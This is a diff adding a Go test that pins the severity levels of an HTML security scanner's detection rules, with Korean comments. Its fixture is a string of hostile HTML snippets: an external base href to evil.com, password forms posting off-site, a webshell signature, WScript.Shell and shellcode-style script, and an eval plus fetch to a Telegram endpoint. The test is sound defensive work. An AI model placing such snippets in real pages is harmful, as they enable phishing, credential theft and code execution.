@@ -43,3 +43,71 @@ func TestSeverityOrder(t *testing.T) {
 		}
 	}
 }
+
+// 규칙마다 등급을 못으로 박는다. 등급은 종료 코드(-min)와 API 의 severity 를 정하는
+// 출력 계약이라, 실수로 바뀌면 조용히 남의 CI 를 통과시키거나 막는다.
+// 값을 바꾸려면 재서 근거를 남기고 이 표를 함께 고친다 (57교시 · 71교시).
+func TestEveryRuleSeverity(t *testing.T) {
+	const html = `
+<base href="https://evil.com/">
+<meta http-equiv="refresh" content="0;url=data:text/html,x">
+<iframe src="https://x.com/" sandbox="allow-scripts allow-same-origin"></iframe>
+<iframe src="data:text/html,x"></iframe>
+<form action="http://192.168.0.1/x"><input type="password"></form>
+<form action="http://login.x.example/"><input type="password" name="pw"></form>
+<form action="http://localhost/login"><input type="password" name="pw2"></form>
+<form action="/x"><input type="text" name="password3"></form>
+<script src="//cdn.x.com/a.js"></script>
+<img src="http://x.com/a.png">
+<a href="javascript:alert(1)" target="_blank">z</a>
+<a href="https://x.com/setup.hta">내려받기</a>
+<p onclick="x()">보이지` + "​" + `않음</p>
+<p>c99shell</p><input type="file">
+<script>new ActiveXObject("WScript.Shell")</script>
+<script>unescape("%uE8FC%u4141")</script>
+<script>eval(atob(x)); fetch("https://api.telegram.org/b/x")</script>
+<noscript><img src="x" alt="</noscript><b>"></noscript>`
+
+	want := map[string]Severity{
+		// HIGH — 공격자의 흔적
+		"base-href-external":         High,
+		"cross-origin-password-form": High,
+		"data-uri-document":          High,
+		"encoded-shellcode":          High,
+		"exfil-channel":              High,
+		"form-action-ip":             High,
+		"local-system-object":        High,
+		"meta-refresh-scheme":        High,
+		"webshell-signature":         High,
+		// MEDIUM — 이 페이지에 실재하는 약점이고 운영자가 고칠 수 있다
+		"cleartext-credentials": Medium,
+		"dangerous-download":    Medium,
+		"iframe-sandbox-escape": Medium,
+		"javascript-url":        Medium,
+		"local-credential-post": Medium,
+		"noscript-breakout":     Medium,
+		"obfuscated-eval":       Medium,
+		"weak-password-field":   Medium,
+		// 페이지가 https 로 확인될 때만 MEDIUM — 스킴을 모르면 INFO (rules_resource_test.go)
+		"mixed-content": Medium,
+		// LOW — 위험의 재료이거나 다른 설명이 가능한 것
+		"inline-handler": Low,
+		"sri-missing":    Low,
+		"zero-width":     Low,
+		// INFO — 전제를 확인하지 못했거나 요즘 브라우저에서 해소된 것
+		"target-blank-no-rel": Info,
+	}
+
+	seen := map[string]bool{}
+	for _, f := range ScanURL(html, "https://page.example/").Findings {
+		if w, ok := want[f.Code]; ok && f.Severity != w {
+			t.Errorf("%s 의 등급 = %v, want %v", f.Code, f.Severity, w)
+		}
+		seen[f.Code] = true
+	}
+	for code := range want {
+		if !seen[code] {
+			t.Errorf("%s 가 발동하지 않음 — 샘플이나 규칙을 확인하라", code)
+		}
+	}
+}
